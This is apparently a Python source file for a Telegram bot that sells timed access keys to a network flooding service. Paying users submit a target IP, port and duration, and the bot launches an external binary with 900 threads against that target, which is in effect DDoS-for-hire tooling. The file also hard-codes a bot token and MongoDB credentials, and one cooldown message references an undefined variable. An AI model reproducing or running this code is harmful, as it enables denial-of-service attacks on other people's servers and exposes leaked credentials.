import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import random
import string
import certifi
from pymongo import MongoClient
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from typing import Dict, List, Optional
import sys
import os

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

KEY_PRICES = {
    'hour': 50,  # 50 Rs per hour
    'day': 150,   # 150 Rs per day
    'week': 600  # 600 Rs per week
}
ADMIN_IDS = [5912395178,7702119573]
BOT_TOKEN = "7043201666:AAFfVtpsP24qCmUoroxNwnXCvZhey2uUIx4"
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
thread_count = 900
packet_size = 9
ADMIN_FILE = 'admin_data.json'
last_attack_times = {}
COOLDOWN_MINUTES = 2

def check_cooldown(user_id: int) -> tuple[bool, int]:
    """
    Check if a user is in cooldown period
    Returns (bool, remaining_seconds)
    """
    if user_id not in last_attack_times:
        return False, 0
        
    last_attack = last_attack_times[user_id]
    current_time = datetime.now()
    time_diff = current_time - last_attack
    cooldown_seconds = COOLDOWN_MINUTES * 60
    
    if time_diff.total_seconds() < cooldown_seconds:
        remaining = cooldown_seconds - time_diff.total_seconds()
        return True, int(remaining)
    return False, 0

def update_last_attack_time(user_id: int):
    """Update the last attack time for a user"""
    last_attack_times[user_id] = datetime.now()


def load_admin_data():
    """Load admin data from file"""
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                return json.load(f)
        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
    except Exception as e:
        logger.error(f"Error loading admin data: {e}")
        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
    
def update_admin_balance(admin_id: str, amount: float) -> bool:
    """
    Update admin's balance after key generation
    Returns True if successful, False if insufficient balance
    """
    try:
        admin_data = load_admin_data()
        
        # Super admins have infinite balance
        if int(admin_id) in ADMIN_IDS:
            return True
            
        if str(admin_id) not in admin_data['admins']:
            return False
            
        current_balance = admin_data['admins'][str(admin_id)]['balance']
        
        if current_balance < amount:
            return False
            
        admin_data['admins'][str(admin_id)]['balance'] -= amount
        save_admin_data(admin_data)
        return True
        
    except Exception as e:
        logging.error(f"Error updating admin balance: {e}")
        return False
    
def save_admin_data(data):
    """Save admin data to file"""
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving admin data: {e}")
        return False
    
def is_super_admin(user_id):
    """Check if user is a super admin"""
    return user_id in ADMIN_IDS

def get_admin_balance(user_id):
    """Get admin's balance"""
    admin_data = load_admin_data()
    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)

def calculate_key_price(amount: int, time_unit: str) -> float:
    """Calculate the price for a key based on duration"""
    base_price = KEY_PRICES.get(time_unit.lower().rstrip('s'), 0)
    return base_price * amount

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(BOT_TOKEN)

# Initialize other required variables
redeemed_keys = set()
loop = None

# File paths
# File paths with absolute directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
KEYS_FILE = os.path.join(BASE_DIR, 'key.txt')


keys = {}

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

def ensure_file_exists(filepath):
    """Ensure the file exists and create if it doesn't"""
    if not os.path.exists(filepath):
        with open(filepath, 'w') as f:
            if filepath.endswith('.txt'):
                f.write('[]')  # Initialize with empty array for users.txt
            else:
                f.write('{}')  # Initialize with empty object for other files

def load_users():
    """Load users from users.txt with proper error handling"""
    ensure_file_exists(USERS_FILE)
    try:
        with open(USERS_FILE, 'r') as f:
            content = f.read().strip()
            if not content:  # If file is empty
                return []
            return json.loads(content)
    except json.JSONDecodeError:
        # If file is corrupted, backup and create new
        backup_file = f"{USERS_FILE}.backup"
        if os.path.exists(USERS_FILE):
            os.rename(USERS_FILE, backup_file)
        return []
    except Exception as e:
        logging.error(f"Error loading users: {e}")
        return []

def save_users(users):
    """Save users to users.txt with proper error handling"""
    ensure_file_exists(USERS_FILE)
    try:
        # Create temporary file
        temp_file = f"{USERS_FILE}.temp"
        with open(temp_file, 'w') as f:
            json.dump(users, f, indent=2)
        
        # Rename temp file to actual file
        os.replace(temp_file, USERS_FILE)
        return True
    except Exception as e:
        logging.error(f"Error saving users: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return False
    
def get_username_from_id(user_id):
    users = load_users()
    for user in users:
        if user['user_id'] == user_id:
            return user.get('username', 'N/A')
    return "N/A"

def is_admin(user_id):
    """Check if user is either a super admin or regular admin"""
    admin_data = load_admin_data()
    return str(user_id) in admin_data['admins'] or user_id in ADMIN_IDS

def load_keys():
    """Load keys with proper error handling"""
    ensure_file_exists(KEYS_FILE)
    keys = {}
    try:
        with open(KEYS_FILE, 'r') as f:
            content = f.read().strip()
            if not content:  # If file is empty
                return {}
                
            # Parse each line as a separate JSON object
            for line in content.split('\n'):
                if line.strip():
                    key_data = json.loads(line)
                    # Each line should contain a single key-duration pair
                    for key, duration_str in key_data.items():
                        days, seconds = map(float, duration_str.split(','))
                        keys[key] = timedelta(days=days, seconds=seconds)
            return keys
                    
    except Exception as e:
        logging.error(f"Error loading keys: {e}")
        return {}

def save_keys(keys: Dict[str, timedelta]):
    """Save keys with proper error handling"""
    ensure_file_exists(KEYS_FILE)
    try:
        temp_file = f"{KEYS_FILE}.temp"
        with open(temp_file, 'w') as f:
            # Write each key-duration pair as a separate JSON object on a new line
            for key, duration in keys.items():
                duration_str = f"{duration.days},{duration.seconds}"
                json_line = json.dumps({key: duration_str})
                f.write(f"{json_line}\n")
        
        # Rename temp file to actual file
        os.replace(temp_file, KEYS_FILE)
        return True
        
    except Exception as e:
        logging.error(f"Error saving keys: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return False
    
def check_user_expiry():
    """Periodically check and remove expired users"""
    while True:
        try:
            users = load_users()
            current_time = datetime.now()
            
            # Filter out expired users
            active_users = [
                user for user in users 
                if datetime.fromisoformat(user['valid_until']) > current_time
            ]
            
            # Only save if there are changes
            if len(active_users) != len(users):
                save_users(active_users)
                
        except Exception as e:
            logging.error(f"Error in check_user_expiry: {e}")
        
        time.sleep(300)  # Check every 5 minutes

def generate_key(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@bot.message_handler(commands=['thread'])
def set_thread_count(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can change thread settings
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change thread settings.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*Please specify the thread count.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_thread_command)

@bot.message_handler(commands=['packet'])
def set_packet_size(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can change packet size settings
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change packet size settings.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*Please specify the packet size.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_packet_command)

def process_packet_command(message):
    global packet_size
    chat_id = message.chat.id

    try:
        new_packet_size = int(message.text)
        
        if new_packet_size <= 0:
            bot.send_message(chat_id, "*Packet size must be a positive number.*", parse_mode='Markdown')
            return

        packet_size = new_packet_size
        bot.send_message(chat_id, f"*Packet size set to {packet_size} for Kala.*", parse_mode='Markdown')

    except ValueError:
        bot.send_message(chat_id, "*Invalid packet size. Please enter a valid number.*", parse_mode='Markdown')

def process_thread_command(message):
    global thread_count
    chat_id = message.chat.id

    try:
        new_thread_count = int(message.text)
        
        if new_thread_count <= 0:
            bot.send_message(chat_id, "*Thread count must be a positive number.*", parse_mode='Markdown')
            return

        thread_count = new_thread_count
        bot.send_message(chat_id, f"*Thread count set to {thread_count} for Kala.*", parse_mode='Markdown')

    except ValueError:
        bot.send_message(chat_id, "*Invalid thread count. Please enter a valid number.*", parse_mode='Markdown')

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        # Update last attack time before starting the attack
        update_last_attack_time(user_id)

        # Construct command for Kala binary with thread count and packet size
        command = f"./Xero {target_ip} {target_port} {duration} {packet_size} {thread_count}"

        # Send initial attack message
        bot.send_message(chat_id, 
            f"ð ðððð®ð°ð¸ ð¦ðð®ð¿ðð²ð±ð¥\n\n"
            f"ð§ð®ð¿ð´ð²ð: {target_ip}:{target_port}\n"
            f"ðððð®ð°ð¸ ð§ð¶ðºð²: {duration} ððð.\n"
            f"ð§ðµð¿ð²ð®ð±ð: {thread_count}\n"
            f"ð£ð®ð°ð¸ð²ð ð¦ð¶ðð²: {packet_size}\n"
            f"á á @RTC_CHEATS á á")

        # Create and run process without output
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        
        # Wait for process to complete
        await process.wait()

        # Send completion message
        bot.send_message(chat_id, 
            f"ðððð®ð°ð¸ ðð¶ð»ð¶ððµð²ð± ð¦ðð°ð°ð²ððð³ðð¹ð¹ð ð")

    except Exception as e:
        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check cooldown first, regardless of admin status
    in_cooldown, remaining = check_cooldown(user_id)
    if in_cooldown:
        minutes = remaining // 60
        seconds = remaining % 60
        bot.send_message(
            chat_id,
            f"*â° Cooldown in progress! Please wait {minutes}m {de}s before starting another attack.*",
            parse_mode='Markdown'
        )
        return

    # If user is admin, allow attack
    if is_admin(user_id):
        try:
            bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command, chat_id)
            return
        except Exception as e:
            logging.error(f"Error in attack command: {e}")
            return

    # For regular users, check if they have a valid key
    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- á @RTC_CHEATS á*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        user_id = message.from_user.id
        
        # Double-check cooldown when processing the attack
        in_cooldown, remaining = check_cooldown(user_id)
        if in_cooldown:
            minutes = remaining // 60
            seconds = remaining % 60
            bot.send_message(
                chat_id,
                f"*â° Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
                parse_mode='Markdown'
            )
            return
            
        args = message.text.split()
        
        if len(args) != 3:
            bot.send_message(chat_id, "*à¤à¤²à¤¤ à¤¹à¥à¤ à¤¹à¥à¥¤ à¤à¥à¤°à¤¾à¤ à¤à¤à¥à¤¨ ð¼*", parse_mode='Markdown')
            return
        
        target_ip = args[0]
        
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
            return
        
        try:
            duration = int(args[2])
        except ValueError:
            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Create a new event loop for this thread if necessary
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        # Run the attack command with user_id
        loop.run_until_complete(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id))
        
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your command.*", parse_mode='Markdown')


@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By á @TGRAZEEM á"  
    bot.send_message(message.chat.id, owner_message)

@bot.message_handler(commands=['addadmin'])
def add_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Only super admins can add new admins
    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to add admins.*", parse_mode='Markdown')
        return

    try:
        # Parse command arguments
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "*Usage: /addadmin <user_id> <balance>*", parse_mode='Markdown')
            return

        new_admin_id = args[1]
        try:
            balance = float(args[2])
            if balance < 0:
                bot.reply_to(message, "*Balance must be a positive number.*", parse_mode='Markdown')
                return
        except ValueError:
            bot.reply_to(message, "*Balance must be a valid number.*", parse_mode='Markdown')
            return

        # Load current admin data
        admin_data = load_admin_data()

        # Add new admin with balance
        admin_data['admins'][new_admin_id] = {
            'balance': balance,
            'added_by': user_id,
            'added_date': datetime.now().isoformat()
        }

        # Save updated admin data
        if save_admin_data(admin_data):
            bot.reply_to(message, f"*Successfully added admin:*\nID: `{new_admin_id}`\nBalance: `{balance}`", parse_mode='Markdown')
            
            # Try to notify the new admin
            try:
                bot.send_message(
                    int(new_admin_id),
                    "*ð Congratulations! You have been promoted to admin!*\n"
                    f"Your starting balance is: `{balance}`\n\n"
                    "You now have access to admin commands:\n"
                    "/genkey - Generate new key\n"
                    "/remove - Remove user\n"
                    "/balance - Check your balance",
                    parse_mode='Markdown'
                )
            except:
                logger.warning(f"Could not send notification to new admin {new_admin_id}")
        else:
            bot.reply_to(message, "*Failed to add admin. Please try again.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in add_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while adding admin.*", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.reply_to(message, "*This command is only available for admins.*", parse_mode='Markdown')
        return

    balance = get_admin_balance(user_id)
    if is_super_admin(user_id):
        bot.reply_to(message, "*You are a super admin with unlimited balance.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"*Your current balance: {balance}*", parse_mode='Markdown')

@bot.message_handler(commands=['removeadmin'])
def remove_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to remove admins.*", parse_mode='Markdown')
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "*Usage: /removeadmin <user_id>*", parse_mode='Markdown')
            return

        admin_to_remove = args[1]
        admin_data = load_admin_data()

        if admin_to_remove in admin_data['admins']:
            del admin_data['admins'][admin_to_remove]
            if save_admin_data(admin_data):
                bot.reply_to(message, f"*Successfully removed admin {admin_to_remove}*", parse_mode='Markdown')
                
                # Try to notify the removed admin
                try:
                    bot.send_message(
                        int(admin_to_remove),
                        "*Your admin privileges have been revoked.*",
                        parse_mode='Markdown'
                    )
                except:
                    pass
            else:
                bot.reply_to(message, "*Failed to remove admin. Please try again.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, "*This user is not an admin.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in remove_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while removing admin.*", parse_mode='Markdown')


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"

    # Create keyboard markup
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    my_account_button = KeyboardButton("ðð² ðððð¨ð®ð§ð­ð¦")
    attack_button = KeyboardButton("ð ðð­ð­ððð¤")
    markup.add(my_account_button, attack_button)

    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! Developed By á @TGRAZEEM á\n\n"
            f"Admin Commands:\n"
            f"/addadmin - Add new admin\n"
            f"/removeadmin - Remove admin\n"
            f"/genkey - Generate new key\n"
            f"/remove - Remove user\n"
            f"/users - List all users\n"
            f"/thread - Set thread count\n"
            f"/packet - Set packet size\n"
        )
    elif is_admin(user_id):
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! Developed By á @TGRAZEEM á\n\n"
            f"Your Balance: {balance}\n\n"
            f"Admin Commands:\n"
            f"/genkey - Generate new key\n"
            f"/remove - Remove user\n"
            f"/balance - Check your balance"
        )
    else:
        welcome_message = (
            f"Welcome, {username}! Developed By á @TGRAZEEM á\n\n"
            f"Please redeem a key to access bot functionalities.\n"
            f"Available Commands:\n"
            f"/redeem - To redeem key\n"
            f"/Attack - Start an attack\n\n"
            f"Contact á @RTC_CHEATS á for new keys"
        )

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: á @RTC_CHEATS á*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, (
            "*Usage: /genkey <amount> <unit>*\n\n"
            "Available units and prices:\n"
            "- hour/hours (50â¹ per hour)\n"
            "- day/days (150â¹ per day)\n"
            "- week/weeks (600â¹ per week)"
        ), parse_mode='Markdown')
        return
    
    try:
        amount = int(cmd_parts[1])
        time_unit = cmd_parts[2].lower()
        
        # Normalize time unit
        base_unit = time_unit.rstrip('s')  # Remove trailing 's' if present
        if base_unit == 'week':
            duration = timedelta(weeks=amount)
            price_unit = 'week'
        elif base_unit == 'day':
            duration = timedelta(days=amount)
            price_unit = 'day'
        elif base_unit == 'hour':
            duration = timedelta(hours=amount)
            price_unit = 'hour'
        else:
            bot.send_message(chat_id, "*Invalid time unit. Use 'hours', 'days', or 'weeks'.*", parse_mode='Markdown')
            return
        
        # Calculate price
        price = calculate_key_price(amount, price_unit)
        
        # Check and update balance
        if not update_admin_balance(str(user_id), price):
            current_balance = get_admin_balance(user_id)
            bot.send_message(chat_id, 
                f"*Insufficient balance!*\n\n"
                f"Required: {price}â¹\n"
                f"Your balance: {current_balance}â¹", 
                parse_mode='Markdown')
            return
        
        # Generate and save key
        global keys
        keys = load_keys()
        key = generate_key()
        keys[key] = duration
        save_keys(keys)
        
        # Send success message
        new_balance = get_admin_balance(user_id)
        success_msg = (
            f"*Key generated successfully!*\n\n"
            f"Key: `{key}`\n"
            f"Duration: {amount} {time_unit}\n"
            f"Price: {price}â¹\n"
            f"Remaining balance: {new_balance}â¹\n\n"
            f"Copy this key and use:\n/redeem {key}"
        )
        
        bot.send_message(chat_id, success_msg, parse_mode='Markdown')
        
        # Log the transaction
        logging.info(f"Admin {user_id} generated key worth {price}â¹ for {amount} {time_unit}")
    
    except ValueError:
        bot.send_message(chat_id, "*Invalid amount. Please enter a number.*", parse_mode='Markdown')
        return
    except Exception as e:
        logging.error(f"Error in genkey_command: {e}")
        bot.send_message(chat_id, "*An error occurred while generating the key.*", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = cmd_parts[1]
    
    # Load the current keys
    global keys
    keys = load_keys()
    
    # Check if the key is valid and not already redeemed
    if key in keys and key not in redeemed_keys:
        duration = keys[key]  # This is already a timedelta
        expiration_time = datetime.now() + duration

        users = load_users()
        # Save the user info to users.txt
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            new_user = {
                'user_id': user_id,
                'username': f"@{message.from_user.username}" if message.from_user.username else "Unknown",
                'valid_until': expiration_time.isoformat().replace('T', ' '),
                'current_date': datetime.now().isoformat().replace('T', ' '),
                'plan': 'Plan Premium'
            }
            users.append(new_user)
        else:
            found_user['valid_until'] = expiration_time.isoformat().replace('T', ' ')
            found_user['current_date'] = datetime.now().isoformat().replace('T', ' ')

        # Mark the key as redeemed
        redeemed_keys.add(key)
        # Remove the used key from the keys file
        del keys[key]
        save_keys(keys)
        save_users(users)

        bot.send_message(chat_id, "*Key redeemed successfully!*", parse_mode='Markdown')
    else:
        if key in redeemed_keys:
            bot.send_message(chat_id, "*This key has already been redeemed!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- á @RTC_CHEATS á*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(cmd_parts[1])
    users = load_users()
    users = [user for user in users if user['user_id'] != target_user_id]
    save_users(users)

    bot.send_message(chat_id, f"User {target_user_id} has been removed.")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can see all users
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to view all users.*", parse_mode='Markdown')
        return

    users = load_users()
    valid_users = [user for user in users if datetime.now() < datetime.fromisoformat(user['valid_until'])]

    if valid_users:
        user_list = "\n".join(f"ID: {user['user_id']} \nUsername: {user.get('username', 'N/A')}" for user in valid_users)
        bot.send_message(chat_id, f"Registered users:\n{user_list}")
    else:
        bot.send_message(chat_id, "No users have valid keys.")

@bot.message_handler(func=lambda message: message.text == "ð ðð­ð­ððð¤")
def attack_button_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check cooldown first, regardless of admin status
    in_cooldown, remaining = check_cooldown(user_id)
    if in_cooldown:
        minutes = remaining // 60
        seconds = remaining % 60
        bot.send_message(
            chat_id,
            f"*â° Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
            parse_mode='Markdown'
        )
        return

    # Rest of the handler remains the same...
    if is_admin(user_id):
        try:
            bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command, chat_id)
            return
        except Exception as e:
            logging.error(f"Error in attack button: {e}")
            return

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*ðð¨ð® ðð«ð ð§ð¨ð­ ð«ðð ð¢ð¬ð­ðð«ðð. ðð¥ððð¬ð ð«ððððð¦ ð ð¤ðð² ðð¨ ðð°ð§ðð«:- á @RIDERBHAI00 á*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*ðð¨ð®ð« ð¤ðð² ð¡ðð¬ ðð±ð©ð¢ð«ðð. ðð¥ððð¬ð ð«ððððð¦ ð ð¤ðð² ðð¨ ðð°ð§ðð«:- á @RIDERBHAI00 á.*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*ðð¥ððð¬ð ðð«ð¨ð¯ð¢ðð â:\n<ðð> <ðððð> <ðððð>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack button: {e}")

@bot.message_handler(func=lambda message: message.text == "ðð² ðððð¨ð®ð§ð­ð¦")
def my_account(message):
    user_id = message.from_user.id
    users = load_users()

    # Find the user in the list
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if is_super_admin(user_id):
            account_info = (
                "ð---------------ððð¦ð¢ð§ ððð¬ð¡ðð¨ðð«ð---------------ð       \n\n"
                "ð  ðð°ð°ð¼ðð»ð ðð²ðð®ð¶ð¹ð               \n"
                "ê±á´á´á´á´ê±: Super Admin\n"
                "á´á´á´á´ê±ê± Êá´á´ á´Ê: Unlimited\n"
                "á´ÊÉªá´ ÉªÊá´É¢á´ê±: Full System Control\n\n"
                "ð¼  ð£ð²ð¿ðºð¶ððð¶ð¼ð»ð \n"
                "â¢ Generate Keys\n"
                "â¢ Manage Admins\n"
                "â¢ System Configuration\n"
                "â¢ Unlimited Balance"
            )
    
    elif is_admin(user_id):
            # For regular admins
            balance = get_admin_balance(user_id)
            account_info = (
                "ð¡ï¸---------------ððð¦ð¢ð§ ðð«ð¨ðð¢ð¥ð---------------ð¡ï¸n\n"
                f"ð°  ðð®ð¹ð®ð»ð°ð²: {balance}â¹\n\n"
                "ð  ðð°ð°ð¼ðð»ð ð¦ðð®ððð:\n"
                "â¢ Êá´Êá´: Admin\n"
                "â¢ á´á´á´á´ê±ê±: Restricted\n"
                "â¢ á´ÊÉªá´ ÉªÊá´É¢á´ê±:\n"
                "  - Generate Keys\n"
                "  - User Management\n"
                "  - Balance Tracking"
            )
    elif found_user:
        valid_until = datetime.fromisoformat(found_user.get('valid_until', 'N/A')).strftime('%Y-%m-%d %H:%M:%S')
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = (
                "ðð¨ð®ð« ð¤ðð² ð¡ðð¬ ðð±ð©ð¢ð«ðð. ðð¥ððð¬ð ð«ððððð¦ ð ð§ðð° ð¤ðð².\n"
                "Contact á @RTC_CHEATS á for assistance."
            )
        else:
            account_info = (
                f"ðð ð¦ð£ ð¸ððð ð¦ðð¥ ðððð ð£ððð¥ðð ð:\n\n"
                f"á´ê±á´ÊÉ´á´á´á´: {found_user.get('username', 'N/A')}\n"
                f"á´ á´ÊÉªá´ á´É´á´ÉªÊ: {valid_until}\n"
                f"á´Êá´É´: {found_user.get('plan', 'N/A')}\n"
                f"á´á´ÊÊá´É´á´ á´Éªá´á´: {current_time}"
            )
    else:
        account_info = "ðð¥ððð¬ð ð«ððððð¦ ð ð¤ðð² ðð¨ ðð°ð§ðð«:- á @RTC_CHEATS"

    bot.send_message(message.chat.id, account_info)

if __name__ == '__main__':
    print("Bot is running...")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Start the asyncio thread
    Thread(target=start_asyncio_thread).start()
    
    # Start the user expiry check thread
    Thread(target=check_user_expiry).start()

    while True:
        try:
            bot.polling(timeout=60)
        except ApiTelegramException as e:
            time.sleep(5)
        except Exception as e:
            time.sleep(5)
